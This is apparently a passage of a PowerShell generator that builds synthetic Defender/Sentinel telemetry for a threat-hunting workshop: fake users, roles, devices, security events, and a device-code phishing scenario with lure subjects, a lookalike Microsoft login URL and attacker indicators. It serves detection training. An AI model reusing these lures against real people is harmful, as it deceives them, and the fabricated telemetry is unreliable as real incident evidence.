    'Security Reader',
    'Security Admin',
    'Virtual Machine Contributor',
    'Key Vault Administrator',
    'Key Vault Reader',
    'Storage Blob Data Reader',
    'Storage Blob Data Contributor',
    'Monitoring Reader',
    'Log Analytics Reader',
    'Automation Contributor',
    'Managed Identity Operator'
)
$entraAssignedRoles = @(
    'Global Administrator',
    'Global Reader',
    'Compliance Administrator',
    'Security Administrator',
    'Privileged Authentication Administrator',
    'Azure AD Joined Device Local Administrator',
    'Application Administrator',
    'Cloud Application Administrator',
    'Directory Readers',
    'Helpdesk Administrator'
)

function Get-WorkshopIdentityGroups {
    param([Parameter(Mandatory)]$Identity)

    $groups = @(
        'All Company',
        $identityGroupCatalog[$Identity.Rid % $identityGroupCatalog.Count]
    )
    if ($Identity.IsServiceAccount) {
        $groups += 'Service Accounts'
    }
    if ($Identity.IsPrivileged) {
        $groups += 'Tenant Owner'
        $groups += 'Tier 0 Operators'
        $groups += 'XDR-SecAdmin-Full'
    }
    elseif (($Identity.Rid % 7) -eq 0) {
        $groups += 'XDR-SecAnalystT1-ReadOnly'
    }
    if ($Identity.Name -eq 'svc_azureadconnect') {
        $groups += 'Entra Connect Operators'
    }

    return @($groups | Select-Object -Unique)
}

function Get-WorkshopIdentityAssignedRoles {
    param([Parameter(Mandatory)]$Identity)

    $roles = @()
    if ($Identity.IsPrivileged) {
        $roles += 'Global Administrator'
        $roles += 'Privileged Authentication Administrator'
        $roles += 'Owner'
        $roles += 'User Access Administrator'
    }
    elseif ($Identity.IsServiceAccount) {
        $roles += $azureRbacAssignedRoles[$Identity.Rid % $azureRbacAssignedRoles.Count]
        if (($Identity.Rid % 3) -eq 0) {
            $roles += 'Managed Identity Operator'
        }
    }
    elseif (($Identity.Rid % 9) -lt 4) {
        $roles += $entraAssignedRoles[$Identity.Rid % $entraAssignedRoles.Count]
        $roles += $azureRbacAssignedRoles[$Identity.Rid % $azureRbacAssignedRoles.Count]
    }

    return @($roles | Select-Object -Unique)
}

function Get-WorkshopIdentityEligibleRoles {
    param([Parameter(Mandatory)]$Identity)

    if ($Identity.IsPrivileged) {
        return @('Security Administrator', 'Key Vault Administrator')
    }
    if (($Identity.Rid % 13) -eq 0) {
        return @('Reader')
    }

    return @()
}

function Get-WorkshopIdentityTags {
    param([Parameter(Mandatory)]$Identity)

    if ($Identity.Name -eq 'svc_azureadconnect') {
        return @('Tier0', 'EntraConnect')
    }
    if ($Identity.IsPrivileged) {
        return @('Privileged')
    }
    if ($Identity.IsServiceAccount) {
        return @('ServiceAccount')
    }

    return @()
}

$seedUsers = @(
    New-WorkshopIdentity -Name 'victor.alvarez' -DisplayName 'Victor Alvarez' -Rid 1104
    New-WorkshopIdentity -Name 'alice.weber' -DisplayName 'Alice Weber' -Rid 1105
    New-WorkshopIdentity -Name 'ina.hoffmann' -DisplayName 'Ina Hoffmann' -Rid 5001 -Privileged
)
$seedServiceAccounts = @(
    New-WorkshopIdentity -Name 'svc_sql' -DisplayName 'SQL Reporting Service' -Rid 2101 -ServiceAccount -Privileged
    New-WorkshopIdentity -Name 'svc_azureadconnect' -DisplayName 'Azure AD Connect Sync' -Rid 2102 -ServiceAccount -Privileged
)

if ($SyntheticUserCount -lt $seedUsers.Count) {
    throw "SyntheticUserCount must be at least $($seedUsers.Count) to include required scenario users."
}
if ($SyntheticServiceAccountCount -lt $seedServiceAccounts.Count) {
    throw "SyntheticServiceAccountCount must be at least $($seedServiceAccounts.Count) to include required scenario service accounts."
}

$firstNames = @('Alex', 'Amelia', 'Avery', 'Blake', 'Casey', 'Dakota', 'Devon', 'Elliot', 'Emerson', 'Finley', 'Harper', 'Hayden', 'Jamie', 'Jordan', 'Kai', 'Kendall', 'Logan', 'Morgan', 'Parker', 'Quinn', 'Reese', 'Riley', 'Rowan', 'Sage', 'Skyler', 'Taylor') + @(
    'Mei', 'Lin', 'Wei', 'Chen', 'Hiro', 'Yuki', 'Aiko', 'Sora', 'Haru', 'Rina', 'Minh', 'Lan', 'Anh', 'Bao', 'Somchai', 'Niran', 'Dara', 'Siti', 'Putri', 'Budi',
    'Jiho', 'Minjun', 'Seojun', 'Doyun', 'Jisoo', 'Hana', 'Minseo', 'Seoah', 'Yuna', 'Haeun', 'Joon', 'Taeyang', 'Hyunwoo', 'Eunji', 'Somin', 'Yerim', 'Nari', 'Bora', 'Sujin', 'Jiwon',
    'Luca', 'Sofia', 'Matteo', 'Giulia', 'Leon', 'Emilia', 'Hugo', 'Camille', 'Lars', 'Freya', 'Astrid', 'Ingrid', 'Maja', 'Anika', 'Pieter', 'Femke', 'Marek', 'Kasia', 'Tomasz', 'Klara',
    'Amara', 'Kwame', 'Kofi', 'Ama', 'Amina', 'Fatou', 'Zola', 'Thandi', 'Nia', 'Chidi', 'Ngozi', 'Ife', 'Ade', 'Temi', 'Sipho', 'Lerato', 'Mandla', 'Ayo', 'Sefu', 'Zuri',
    'Aarav', 'Vivaan', 'Arjun', 'Vihaan', 'Isha', 'Anaya', 'Priya', 'Kavya', 'Rohan', 'Neha', 'Meera', 'Aditi', 'Nikhil', 'Sanjay', 'Kiran', 'Lakshmi', 'Deepa', 'Raj', 'Amit', 'Pooja'
)
$lastNames = @('Adams', 'Baker', 'Bennett', 'Brooks', 'Carter', 'Cooper', 'Diaz', 'Edwards', 'Evans', 'Foster', 'Garcia', 'Gray', 'Harris', 'Hayes', 'Hughes', 'Jackson', 'Kelly', 'Lewis', 'Martinez', 'Miller', 'Morgan', 'Nelson', 'Parker', 'Reed', 'Rivera', 'Roberts', 'Scott', 'Smith', 'Taylor', 'Turner', 'Walker', 'Ward', 'Wood', 'Young') + @(
    'Chen', 'Wang', 'Li', 'Zhang', 'Liu', 'Tanaka', 'Sato', 'Suzuki', 'Nguyen', 'Tran', 'Le', 'Pham', 'Hoang', 'Lim', 'Wong', 'Chua', 'Rahman', 'Hidayat', 'Prasetyo', 'Santos',
    'Kim', 'Lee', 'Park', 'Choi', 'Jung', 'Kang', 'Cho', 'Yoon', 'Jang', 'Im', 'Han', 'Oh', 'Seo', 'Shin', 'Kwon', 'Hwang', 'Ahn', 'Song', 'Yoo', 'Moon',
    'Muller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker', 'Hoffmann', 'Schulz', 'Novak', 'Kowalski', 'Rossi', 'Bianchi', 'Romano', 'Dubois', 'Moreau', 'Laurent', 'Martin', 'Bernard',
    'Okafor', 'Mensah', 'Ndlovu', 'Diop', 'Abebe', 'Tesfaye', 'Kamau', 'Mwangi', 'Diallo', 'Traore', 'Adeyemi', 'Okonkwo', 'Mbeki', 'Khumalo', 'Dlamini', 'Osei', 'Balogun', 'Nkrumah', 'Mbatha', 'Toure',
    'Sharma', 'Singh', 'Kumar', 'Gupta', 'Iyer', 'Nair', 'Reddy', 'Rao', 'Pillai', 'Chatterjee', 'Banerjee', 'Desai', 'Mehta', 'Joshi', 'Kapoor', 'Malhotra', 'Agarwal', 'Bhat', 'Menon', 'Verma'
)

$generatedUsers = for ($i = 1; $i -le ($SyntheticUserCount - $seedUsers.Count); $i++) {
    $first = $firstNames[($i - 1) % $firstNames.Count]
    $lastIndex = [int]([Math]::Floor(($i - 1) / $firstNames.Count) % $lastNames.Count)
    $last = $lastNames[$lastIndex]
    $name = ('{0}.{1}{2:D4}' -f $first.ToLowerInvariant(), $last.ToLowerInvariant(), $i)
    New-WorkshopIdentity -Name $name -DisplayName "$first $last" -Rid (1200 + $i)
}
$generatedServiceAccounts = for ($i = 1; $i -le ($SyntheticServiceAccountCount - $seedServiceAccounts.Count); $i++) {
    $name = 'svc_app{0:D4}' -f $i
    New-WorkshopIdentity -Name $name -DisplayName ('Application Service {0:D4}' -f $i) -Rid (3000 + $i) -ServiceAccount:($true) -Privileged:($i % 50 -eq 0)
}

$users = @($seedUsers + $generatedUsers + $seedServiceAccounts + $generatedServiceAccounts)
$victor = $users | Where-Object Name -eq 'victor.alvarez' | Select-Object -First 1
$alice = $users | Where-Object Name -eq 'alice.weber' | Select-Object -First 1
$svcSql = $users | Where-Object Name -eq 'svc_sql' | Select-Object -First 1
$svcSync = $users | Where-Object Name -eq 'svc_azureadconnect' | Select-Object -First 1

$devices = @(
    [pscustomobject]@{ Name = "DC01.$corpFqdn"; ShortName = 'DC01'; DeviceId = New-StableHex 'DC01' 40; IP = '10.42.0.10'; PublicIP = '198.51.100.10'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "DC02.$corpFqdn"; ShortName = 'DC02'; DeviceId = New-StableHex 'DC02' 40; IP = '10.42.0.11'; PublicIP = '198.51.100.11'; OS = 'WindowsServer2025'; Type = 'DomainController'; AssetValue = 'High' },
    [pscustomobject]@{ Name = "AADCONNECT01.$corpFqdn"; ShortName = 'AADCONNECT01'; DeviceId = New-StableHex 'AADCONNECT01' 40; IP = '10.42.0.20'; PublicIP = '198.51.100.20'; OS = 'WindowsServer2025'; Type = 'EntraConnect'; AssetValue = 'High' }
)

for ($i = 1; $i -le 10; $i++) {
    $devices += [pscustomobject]@{
        Name = ('WIN11-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('WIN11-{0:D2}' -f $i)
        DeviceId = New-StableHex ('WIN11-{0:D2}' -f $i) 40
        IP = ('10.42.10.{0}' -f (20 + $i))
        PublicIP = '198.51.100.50'
        OS = 'Windows11'
        Type = 'Workstation'
        AssetValue = 'Normal'
    }
}
for ($i = 1; $i -le 5; $i++) {
    $devices += [pscustomobject]@{
        Name = ('UBUNTU-{0:D2}.{1}' -f $i, $corpFqdn)
        ShortName = ('UBUNTU-{0:D2}' -f $i)
        DeviceId = New-StableHex ('UBUNTU-{0:D2}' -f $i) 40
        IP = ('10.42.20.{0}' -f (30 + $i))
        PublicIP = '198.51.100.60'
        OS = 'Ubuntu'
        Type = 'LinuxServer'
        AssetValue = 'Normal'
    }
}

# ---------------------------------------------------------------------------
# Fleet expansion
#
# The 18 devices above are the named scenario hosts and must keep their exact
# identifiers, because the investigation acts reference them directly. Everything
# beyond that is ambient fleet so students hunt inside a realistic estate rather than
# a lab of 18 machines.
#
# The archetype weights below come from the real DeviceInfo sample: Workstation 52%,
# Server 25%, Unknown 8.5%, AudioAndVideo 7.9%, NetworkDevice 5.3%, with OSPlatform
# split Windows11 44%, Linux 29%, WindowsServer2025 16%, Windows11WVD 7%.
#
# OS is restricted to the three values the rest of the generator branches on, while the
# richer real-world attributes ride along as extra properties for DeviceInfo.
# ---------------------------------------------------------------------------
$deviceArchetypes = @(
    [pscustomobject]@{ Weight = 44; Prefix = 'WKS'; OS = 'Windows11'; Type = 'Workstation'; Category = 'Endpoint'; Distribution = 'Windows11'; OSVersion = '10.0'; Architecture = '64-bit'; Join = 'Domain Joined'; Subnet = '10.42.11' }
    [pscustomobject]@{ Weight = 8; Prefix = 'WVD'; OS = 'Windows11'; Type = 'Workstation'; Category = 'Endpoint'; Distribution = 'Windows11WVD'; OSVersion = '10.0'; Architecture = '64-bit'; Join = 'AAD Joined'; Subnet = '10.42.12' }
    [pscustomobject]@{ Weight = 16; Prefix = 'SRV'; OS = 'WindowsServer2025'; Type = 'Server'; Category = 'Endpoint'; Distribution = 'WindowsServer2025'; OSVersion = '10.0'; Architecture = '64-bit'; Join = 'Domain Joined'; Subnet = '10.42.1' }
    [pscustomobject]@{ Weight = 17; Prefix = 'LNX'; OS = 'Ubuntu'; Type = 'LinuxServer'; Category = 'Endpoint'; Distribution = 'Ubuntu'; OSVersion = '24.04'; Architecture = '64-bit'; Join = ''; Subnet = '10.42.21' }
    [pscustomobject]@{ Weight = 6; Prefix = 'RHEL'; OS = 'Ubuntu'; Type = 'LinuxServer'; Category = 'Endpoint'; Distribution = 'RedHatEnterpriseLinux'; OSVersion = '9.4'; Architecture = '64-bit'; Join = ''; Subnet = '10.42.22' }
    [pscustomobject]@{ Weight = 5; Prefix = 'NET'; OS = 'Ubuntu'; Type = 'NetworkDevice'; Category = 'NetworkDevice'; Distribution = 'OpenWRT'; OSVersion = '3.0'; Architecture = '32-bit'; Join = ''; Subnet = '10.42.40' }
    [pscustomobject]@{ Weight = 4; Prefix = 'IOT'; OS = 'Ubuntu'; Type = 'SmartAppliance'; Category = 'IoT'; Distribution = 'WebOs'; OSVersion = '8.10'; Architecture = '32-bit'; Join = ''; Subnet = '10.42.41' }
)
$archetypeTotalWeight = ($deviceArchetypes | Measure-Object -Property Weight -Sum).Sum
$machineGroups = @('EUROPE', 'EUROPE', 'EUROPE', 'KOREA', 'Discovered', 'UnassignedGroup')
$sensorStates = @('Active', 'Active', 'Active', 'Active', 'Inactive')
$onboardingStates = @('Onboarded', 'Onboarded', 'Onboarded', 'Can be onboarded', 'Unsupported')

# Array append is O(n^2); a List keeps fleet construction linear at thousands of hosts.
$deviceList = [System.Collections.Generic.List[object]]::new()
foreach ($seedDevice in $devices) {
    $seedDevice | Add-Member -NotePropertyName DeviceCategory -NotePropertyValue 'Endpoint' -Force
    $seedDevice | Add-Member -NotePropertyName OSDistribution -NotePropertyValue $seedDevice.OS -Force
    $seedDevice | Add-Member -NotePropertyName FleetMachineGroup -NotePropertyValue 'EUROPE' -Force
    $seedDevice | Add-Member -NotePropertyName JoinType -NotePropertyValue 'Domain Joined' -Force
    $seedDevice | Add-Member -NotePropertyName SensorHealthState -NotePropertyValue 'Active' -Force
    $seedDevice | Add-Member -NotePropertyName OnboardingStatus -NotePropertyValue 'Onboarded' -Force
    $seedDevice | Add-Member -NotePropertyName IsScenarioDevice -NotePropertyValue $true -Force
    $deviceList.Add($seedDevice)
}

$fleetTarget = [Math]::Max(0, $SyntheticDeviceCount - $deviceList.Count)
for ($i = 1; $i -le $fleetTarget; $i++) {
    # Deterministic archetype selection keeps the fleet identical across worker
    # processes without consuming the shared random stream.
    $roll = ([Convert]::ToInt32((New-StableHex "fleet-archetype|$i" 6), 16)) % $archetypeTotalWeight
    $running = 0
    $archetype = $deviceArchetypes[0]
    foreach ($candidate in $deviceArchetypes) {
        $running += $candidate.Weight
        if ($roll -lt $running) { $archetype = $candidate; break }
    }

    $shortName = '{0}-{1:D5}' -f $archetype.Prefix, $i
    $deviceList.Add([pscustomobject]@{
            Name = ('{0}.{1}' -f $shortName, $corpFqdn)
            ShortName = $shortName
            DeviceId = New-StableHex $shortName 40
            IP = ('{0}.{1}' -f $archetype.Subnet, (1 + ($i % 254)))
            PublicIP = ('198.51.100.{0}' -f (100 + ($i % 150)))
            OS = $archetype.OS
            Type = $archetype.Type
            AssetValue = if (($i % 97) -eq 0) { 'High' } else { 'Normal' }
            DeviceCategory = $archetype.Category
            OSDistribution = $archetype.Distribution
            FleetMachineGroup = $machineGroups[$i % $machineGroups.Count]
            JoinType = $archetype.Join
            SensorHealthState = $sensorStates[$i % $sensorStates.Count]
            OnboardingStatus = $onboardingStates[$i % $onboardingStates.Count]
            IsScenarioDevice = $false
        })
}
$devices = $deviceList.ToArray()
Write-Host "Device fleet: $($devices.Count) device(s), including $(@($devices | Where-Object IsScenarioDevice).Count) named scenario host(s)"

$win04 = $devices | Where-Object ShortName -eq 'WIN11-04'
$dc01 = $devices | Where-Object ShortName -eq 'DC01'
$aadc = $devices | Where-Object ShortName -eq 'AADCONNECT01'
$domainControllers = @($devices | Where-Object Type -eq 'DomainController')
$windowsDevices = @($devices | Where-Object { $_.OS -like 'Windows*' })
$linuxDevices = @($devices | Where-Object { $_.OS -eq 'Ubuntu' })
$linux03 = $linuxDevices | Where-Object ShortName -eq 'UBUNTU-03'
$linuxDb = $linuxDevices | Where-Object ShortName -eq 'UBUNTU-05'

# Bind a small set of primary users to each device. Real endpoint telemetry shows one
# or two human accounts per host, not a uniform draw across the whole directory: a
# 1000-row real DeviceProcessEvents sample contains only 10 distinct account names.
# The stable hash keeps the binding identical across worker processes.
$script:DevicePrimaryUsers = @{}
foreach ($boundDevice in $devices) {
    $bindingSeed = [Convert]::ToInt32((New-StableHex "device-user|$($boundDevice.ShortName)" 7), 16)
    $script:DevicePrimaryUsers[$boundDevice.ShortName] = @(
        $users[$bindingSeed % $users.Count]
        $users[(($bindingSeed * 7) + 13) % $users.Count]
    )
}

# ---------------------------------------------------------------------------
# Catalogs for the email, identity, OAuth, behavior, and Windows Security tables
# added for the device-code phishing act.
# ---------------------------------------------------------------------------
$emailSubjectCatalog = @(
    [pscustomobject]@{ Subject = 'Q3 budget review - action needed'; Sender = 'finance'; Domain = 'contoso-partners.example'; DisplayName = 'Contoso Finance' }
    [pscustomobject]@{ Subject = 'Updated travel roster for Wiesbaden'; Sender = 'travel'; Domain = 'gsa-travel.example'; DisplayName = 'Travel Desk' }
    [pscustomobject]@{ Subject = 'Your monthly security digest'; Sender = 'no-reply'; Domain = 'security-digest.example'; DisplayName = 'Security Digest' }
    [pscustomobject]@{ Subject = 'Contract award notification'; Sender = 'contracts'; Domain = 'acquisition-portal.example'; DisplayName = 'Acquisition Portal' }
    [pscustomobject]@{ Subject = 'Shared document: After Action Review'; Sender = 'sharepoint'; Domain = 'collab-notify.example'; DisplayName = 'SharePoint Online' }
    [pscustomobject]@{ Subject = 'Password expiry reminder'; Sender = 'helpdesk'; Domain = 'it-servicedesk.example'; DisplayName = 'IT Service Desk' }
    [pscustomobject]@{ Subject = 'Weekly maintenance window'; Sender = 'operations'; Domain = 'usag-ops.example'; DisplayName = 'Operations' }
    [pscustomobject]@{ Subject = 'Invoice 48219 is ready'; Sender = 'billing'; Domain = 'vendor-invoices.example'; DisplayName = 'Vendor Billing' }
)

$emailUrlCatalog = @(
    [pscustomobject]@{ Url = 'https://collab-notify.example/share/afteraction'; Domain = 'collab-notify.example' }
    [pscustomobject]@{ Url = 'https://it-servicedesk.example/password/reset'; Domain = 'it-servicedesk.example' }
    [pscustomobject]@{ Url = 'https://vendor-invoices.example/invoice/48219'; Domain = 'vendor-invoices.example' }
    [pscustomobject]@{ Url = 'https://acquisition-portal.example/award/2026-114'; Domain = 'acquisition-portal.example' }
    [pscustomobject]@{ Url = 'https://security-digest.example/monthly/2026-07'; Domain = 'security-digest.example' }
    [pscustomobject]@{ Url = 'https://usag-ops.example/maintenance'; Domain = 'usag-ops.example' }
    [pscustomobject]@{ Url = 'https://login.microsoftonline.com/common/oauth2/authorize'; Domain = 'login.microsoftonline.com' }
    [pscustomobject]@{ Url = 'https://teams.microsoft.com/l/meetup-join/19%3ameeting'; Domain = 'teams.microsoft.com' }
)

$emailAttachmentCatalog = @(
    [pscustomobject]@{ FileName = 'Q3_Budget_Review.xlsx'; FileType = 'xlsx'; Extension = 'xlsx'; Size = 184320 }
    [pscustomobject]@{ FileName = 'Travel_Roster.pdf'; FileType = 'pdf'; Extension = 'pdf'; Size = 92160 }
    [pscustomobject]@{ FileName = 'After_Action_Review.docx'; FileType = 'docx'; Extension = 'docx'; Size = 245760 }
    [pscustomobject]@{ FileName = 'Contract_Award_2026-114.pdf'; FileType = 'pdf'; Extension = 'pdf'; Size = 133120 }
    [pscustomobject]@{ FileName = 'Invoice_48219.pdf'; FileType = 'pdf'; Extension = 'pdf'; Size = 71680 }
    [pscustomobject]@{ FileName = 'Maintenance_Window.ics'; FileType = 'ics'; Extension = 'ics'; Size = 4096 }
)

$oauthAppCatalog = @(
    [pscustomobject]@{ Name = 'Microsoft Teams'; Publisher = 'Microsoft Corporation'; PublisherId = '00000000-0000-0000-0000-000000000001'; PrivilegeLevel = 'Low'; Permissions = @('User.Read', 'Files.Read'); ConsentedUsers = 4200; AdminConsented = $true; Origin = 'FirstParty' }
    [pscustomobject]@{ Name = 'Azure CLI'; Publisher = 'Microsoft Corporation'; PublisherId = '00000000-0000-0000-0000-000000000001'; PrivilegeLevel = 'Medium'; Permissions = @('user_impersonation'); ConsentedUsers = 180; AdminConsented = $true; Origin = 'FirstParty' }
    [pscustomobject]@{ Name = 'Visual Studio Code'; Publisher = 'Microsoft Corporation'; PublisherId = '00000000-0000-0000-0000-000000000001'; PrivilegeLevel = 'Medium'; Permissions = @('User.Read', 'offline_access'); ConsentedUsers = 320; AdminConsented = $true; Origin = 'FirstParty' }
    [pscustomobject]@{ Name = 'Contoso Timesheet Connector'; Publisher = 'Contoso Ltd'; PublisherId = '9a1c1f4e-2b70-4d61-9f1a-77c1b2c0d3e5'; PrivilegeLevel = 'Medium'; Permissions = @('User.Read.All', 'Calendars.Read'); ConsentedUsers = 95; AdminConsented = $true; Origin = 'Gallery' }
    [pscustomobject]@{ Name = 'Adobe Acrobat Sign'; Publisher = 'Adobe Inc.'; PublisherId = '3f2a8c19-4d5e-4b7a-9c8d-1e2f3a4b5c6d'; PrivilegeLevel = 'Low'; Permissions = @('User.Read', 'Files.ReadWrite'); ConsentedUsers = 240; AdminConsented = $true; Origin = 'Gallery' }
    [pscustomobject]@{ Name = 'Legacy Reporting Add-in'; Publisher = ''; PublisherId = ''; PrivilegeLevel = 'High'; Permissions = @('Directory.Read.All', 'Mail.Read'); ConsentedUsers = 3; AdminConsented = $false; Origin = 'Custom' }
)

$behaviorCatalog = @(
    [pscustomobject]@{ ActionType = 'SuspiciousSignInFollowedByMailboxAccess'; Title = 'Suspicious sign-in followed by mailbox access'; Description = 'A sign-in with unfamiliar properties was followed by mailbox activity.'; Category = 'InitialAccess'; Techniques = 'T1078.004'; ServiceSource = 'Microsoft Defender for Cloud Apps'; DetectionSource = 'Behavior analytics'; DataSources = 'CloudAppEvents'; EntityType = 'User'; Insights = 'Unfamiliar sign-in properties' }
    [pscustomobject]@{ ActionType = 'AnomalousFileDownloadVolume'; Title = 'Anomalous file download volume'; Description = 'A user downloaded significantly more files than their baseline.'; Category = 'Collection'; Techniques = 'T1530'; ServiceSource = 'Microsoft Defender for Cloud Apps'; DetectionSource = 'Behavior analytics'; DataSources = 'CloudAppEvents'; EntityType = 'User'; Insights = 'Volume exceeds 30-day baseline' }
    [pscustomobject]@{ ActionType = 'UncommonProcessExecution'; Title = 'Uncommon process executed on endpoint'; Description = 'A process rarely seen in the organization executed on this device.'; Category = 'Execution'; Techniques = 'T1059'; ServiceSource = 'Microsoft Defender for Endpoint'; DetectionSource = 'Behavior analytics'; DataSources = 'DeviceProcessEvents'; EntityType = 'Process'; Insights = 'Prevalence below organizational threshold' }
    [pscustomobject]@{ ActionType = 'ImpossibleTravelActivity'; Title = 'Impossible travel activity'; Description = 'Sign-ins from geographically distant locations in a short window.'; Category = 'InitialAccess'; Techniques = 'T1078'; ServiceSource = 'Microsoft Defender for Cloud Apps'; DetectionSource = 'Behavior analytics'; DataSources = 'SigninLogs'; EntityType = 'User'; Insights = 'Travel speed exceeds feasible threshold' }
    [pscustomobject]@{ ActionType = 'FirstTimeAdminActivity'; Title = 'First time administrative activity'; Description = 'An account performed an administrative operation for the first time.'; Category = 'PrivilegeEscalation'; Techniques = 'T1098'; ServiceSource = 'Microsoft Defender XDR'; DetectionSource = 'Behavior analytics'; DataSources = 'AuditLogs'; EntityType = 'User'; Insights = 'No prior admin operations observed' }
)

# Windows Security log events the workshop investigation depends on. Entries are
# repeated so the generated EventID mix approximates the real sample, where 4624, 4672,
# and 4634 together account for 937 of 1000 rows and 4674 for another 52. The
# Kerberos and process creation events are rarer but are what the Kerberoasting and
# credential access acts are hunted with.
$securityEventCatalog = @(
    [pscustomobject]@{ EventID = 4624; Activity = '4624 - An account was successfully logged on.'; Task = 12544; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = 'Kerberos'; AuthenticationPackage = 'Kerberos'; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4672; Activity = '4672 - Special privileges assigned to new logon.'; Task = 12548; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4634; Activity = '4634 - An account was logged off.'; Task = 12545; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4624; Activity = '4624 - An account was successfully logged on.'; Task = 12544; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = 'Kerberos'; AuthenticationPackage = 'Kerberos'; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4672; Activity = '4672 - Special privileges assigned to new logon.'; Task = 12548; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4634; Activity = '4634 - An account was logged off.'; Task = 12545; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4624; Activity = '4624 - An account was successfully logged on.'; Task = 12544; LogonType = 5; LogonTypeName = '5 - Service'; LogonProcessName = 'Advapi  '; AuthenticationPackage = 'Negotiate'; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4674; Activity = '4674 - An operation was attempted on a privileged object.'; Task = 13056; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4672; Activity = '4672 - Special privileges assigned to new logon.'; Task = 12548; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4634; Activity = '4634 - An account was logged off.'; Task = 12545; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4625; Activity = '4625 - An account failed to log on.'; Task = 12544; LogonType = 3; LogonTypeName = '3 - Network'; LogonProcessName = 'NtLmSsp '; AuthenticationPackage = 'NTLM'; Status = '0xc000006d'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4688; Activity = '4688 - A new process has been created.'; Task = 13312; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4768; Activity = '4768 - A Kerberos authentication ticket (TGT) was requested.'; Task = 14339; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = 'Kerberos'; Status = '0x0'; TicketEncryptionType = '0x12'; ServiceName = 'krbtgt' }
    [pscustomobject]@{ EventID = 4769; Activity = '4769 - A Kerberos service ticket was requested.'; Task = 14337; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = 'Kerberos'; Status = '0x0'; TicketEncryptionType = '0x12'; ServiceName = 'MSSQLSvc/sql01.usag-cyber.local:1433' }
    [pscustomobject]@{ EventID = 4720; Activity = '4720 - A user account was created.'; Task = 13824; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
    [pscustomobject]@{ EventID = 4732; Activity = '4732 - A member was added to a security-enabled local group.'; Task = 13826; LogonType = 0; LogonTypeName = ''; LogonProcessName = ''; AuthenticationPackage = ''; Status = '0x0'; TicketEncryptionType = ''; ServiceName = '' }
)

# ---------------------------------------------------------------------------
# Tier 2 catalogs. Every distribution below is measured from the exported
# DIBSecCom sample in sample\<DTG>\_field-profiles rather than assumed.
# ---------------------------------------------------------------------------

# ThreatIntelIndicators. In the real sample ObservableKey is
# network-traffic:src_ref.value on 971 of 1000 rows, file:hashes.'SHA-256' on 15,
# and domain-name:value on 6. Scenario indicators are listed first so students can
# join threat intelligence to the attacker infrastructure that already appears in
# the endpoint, identity, and cloud tables.
$threatIntelScenarioIndicators = @(
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Value = $externalIp; Confidence = 100; Tlp = 'Amber'; Tags = 'midnight-blizzard,device-code-phishing,actor:MB,p:high' }
    [pscustomobject]@{ Key = 'domain-name:value'; Value = $c2Host; Confidence = 100; Tlp = 'Amber'; Tags = 'midnight-blizzard,c2,actor:MB,p:high' }
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Value = $c2Ip; Confidence = 100; Tlp = 'Amber'; Tags = 'midnight-blizzard,c2,actor:MB,p:high' }
    [pscustomobject]@{ Key = 'url:value'; Value = 'https://login.microsftonline.device-auth.example/common/oauth2/deviceauth'; Confidence = 100; Tlp = 'Amber'; Tags = 'midnight-blizzard,phishing,actor:MB,p:high' }
)

# Commodity indicator shapes that fill the long tail. The honeypot tag block and the
# ic/vic/gid key format are copied from the real MDTI connector output.
$threatIntelObservableCatalog = @(
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Kind = 'Ipv4'; Confidence = 100; Tlp = 'Green' }
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Kind = 'Ipv4'; Confidence = 100; Tlp = 'Green' }
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Kind = 'Ipv4'; Confidence = 100; Tlp = 'Green' }
    [pscustomobject]@{ Key = 'network-traffic:src_ref.value'; Kind = 'Ipv4'; Confidence = 75; Tlp = 'White' }
    [pscustomobject]@{ Key = "file:hashes.'SHA-256'"; Kind = 'Sha256'; Confidence = 100; Tlp = 'Green' }
    [pscustomobject]@{ Key = 'domain-name:value'; Kind = 'Domain'; Confidence = 60; Tlp = 'Green' }
    [pscustomobject]@{ Key = 'url:value'; Kind = 'Url'; Confidence = 75; Tlp = 'White' }
